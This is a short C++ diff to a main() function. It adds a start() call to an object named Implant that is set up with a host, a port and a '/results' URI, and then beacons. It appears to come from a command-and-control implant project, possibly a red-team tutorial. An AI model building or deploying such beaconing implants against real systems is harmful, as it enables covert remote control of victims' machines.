@@ -10,7 +10,7 @@ int main()
     const auto uri = "/results";
 
     Implant implant{ host, port, uri };
-    
+    implant.start();
     try {
         implant.beacon();
     }
